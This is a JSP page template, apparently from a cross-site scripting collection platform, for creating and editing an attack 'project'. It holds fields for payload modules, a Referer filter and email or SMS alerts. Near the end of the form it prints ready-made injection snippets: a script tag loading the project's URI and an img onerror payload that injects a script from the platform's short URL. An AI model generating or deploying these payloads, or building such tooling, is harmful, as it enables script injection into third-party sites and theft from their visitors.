<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="/WEB-INF/tld/c.tld"%>
<html>
<head lang="en">
<jsp:include page="../base/head.jsp" />
</head>
<body style="text-align:center;">
	<div style="margin:0px auto">
		<jsp:include page="../base/nav.jsp" />
		<div class="am-container">
			<jsp:include page="../base/left.jsp" />
			<div class="am-u-sm-12 am-u-md-12 am-u-lg-9">
				<div class="am-g">
					<div class="am-u-md-12">
						<div class="am-panel am-panel-default">
							<div class="am-panel-hd">创建项目</div>
							<div class="am-panel-bd">
								<form action="" class="am-form" id="dataform" data-am-validator>
									<input type="hidden" value=${project.id } name="id">
									<fieldset>
										<legend>项目及代码</legend>
										<div class="am-form-group">
											<label for="doc-vld-name-2"><small>项目名称：</small></label> <input type="text"
												id="doc-vld-name-2" name="title" datatype="*1-48"
												errormsg="请输入正确的项目名" sucmsg="输入正确" nullmsg="请输入项目名"
												placeholder="输入项目名称（至少 1 个字符）" value="${project.title }" />
										</div>
										<div class="am-form-group">
											<label for="doc-vld-ta-2"><small>项目描述：</small></label>
											<textarea id="doc-vld-ta-2" name="remark" >${project.remark }</textarea>
										</div>
										<div class="am-form-group">
											<label for="doc-vld-ta-2"><small>过滤Referer：</small></label>
											<textarea id="doc-vld-ta-2" name="filter">${project.filter }</textarea><span>多个地址逗号分割</span>
										</div>
										<div style="text-align: left;">
										<c:if test="${!empty userModules }">
											<p>
												<label for="doc-vld-ta-2"><small>用户模块</small> </label>
											</p>
											<p>
												<c:forEach items="${userModules }" var="module"
													varStatus="index">
													<input type="radio" name="module.id" datatype="n1-11" id="userModule${index.index}"
														errormsg="请选择模块" sucmsg="输入正确" nullmsg="请选择模块"
														<c:if test="${project.module.id==module.id }">checked="checked"</c:if>
														value="${module.id }" /> <label style="color: #7A7D7E" for="userModule${index.index}"><small>${module.title }</small> </label>
											<c:if test="${(index.index+1)%4==0 &&index.index!=0 }">
											</p>


											<p>
										</c:if>
										<c:if test="${(index.index+1)%5==0 &&index.index!=0}">
											<tr bgcolor="#f6f6f6"
												style="background-color: rgb(246, 246, 246); background-position: initial initial; background-repeat: initial initial;">
										</c:if>
										</c:forEach>
										</p>
										</c:if>
										<c:if test="${!empty sysModules }">
											<p>
												<label for="doc-vld-ta-2"><small>系统模块</small> </label>
											</p>
											<p>
												<c:forEach items="${sysModules }" var="module"
													varStatus="index">
													<input type="radio" name="module.id" datatype="n1-11" id="sysModule${index.index}"
														errormsg="请选择模块" sucmsg="输入正确" nullmsg="请选择模块"
														<c:if test="${project.module.id==module.id }">checked="checked"</c:if>
														value="${module.id }" /> <label style="color: #7A7D7E"  for="sysModule${index.index}"><small>${module.title }</small> </label>
											<c:if test="${(index.index+1)%4==0 &&index.index!=0 }">
											</p>
											<p>
										</c:if>
										<c:if test="${(index.index+1)%5==0 &&index.index!=0}">
											<tr bgcolor="#f6f6f6"
												style="background-color: rgb(246, 246, 246); background-position: initial initial; background-repeat: initial initial;">
										</c:if>
										</c:forEach>
										</p>
										</c:if>
										</div>
										<c:if test="${(!empty project)&&(!empty project.uri) }">
											<div class="am-form-group">
												<span><label><small>引用代码：</small></label><span class="doc-example">&lt;script src=${project.uri }&gt;&lt;/script&gt;</span></span> <br>
												<span><label><small>引用短路径代码：</small></label><span class="doc-example">&lt;script src=${project.sortUri }&gt;&lt;/script&gt;</span></span> <br>
												<span><label><small>img插入：</small></label><span class="doc-example">&lt;img src=x onerror=s=createElement('script');body.appendChild(s);s.src='${project.sortUri }';&gt;</span></span> 
												
												</div>
										</c:if>
										<div class="am-form-group">
											<label for="doc-vld-ta-2"><small>信封提醒</small> </label>
										</div>
										<div class="am-form-group">
											<input type="checkbox" name="openEmail" id="openEmail"
														<c:if test="${project.openEmail==1 }">checked="checked"</c:if>
														value="1" /><label style="color: #7A7D7E"  for="openEmail"><small>开启邮箱提醒</small></label>
														<lable >&nbsp; &nbsp; </lable><input type="checkbox" name="openMobile" id="openMobile"
														<c:if test="${project.openMobile==1 }">checked="checked"</c:if>
														value="1" /><label style="color: #7A7D7E"  for="openMobile"><small>开启短信提醒</small></label>
														<br/><small style="color: red">请确保个人资料已设置邮箱或手机</small>
										</div>
										
										
										<p>
										<button type="submit" name=""
										class="am-btn am-btn-success am-btn-xs">
										&nbsp;保 存&nbsp;
										</button>
											
										</p>
									</fieldset>
								</form>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<jsp:include page="../base/foot.jsp" />
	</div>
	<jsp:include page="../base/js.jsp" />
</body>
<style>
.am-form-group {
	text-align: left;
}
</style>
<script>
	$("#dataform").Validform({
		label : ".lable",
		showAllError : false,
		postonce : true,
		tiptype : 3,
		beforeSubmit : function(curform) {
			submitForm();
			return false;
		}
	});
	function submitForm() {
		$.ajax({
			type : "POST",
			dataType : 'json',
			data : $("#dataform").serialize(),
			url : 'saveProject.${defSuffix}',
			timeout : 60000,
			success : function(json) {
				alert(json.msg);
				if (json.code == 0) {
					location.href='${basePath }user/index.${defSuffix}';
				}

			},
			error : function() {
				alert("系统繁忙");
			}

		});
	}
</script>
</html>
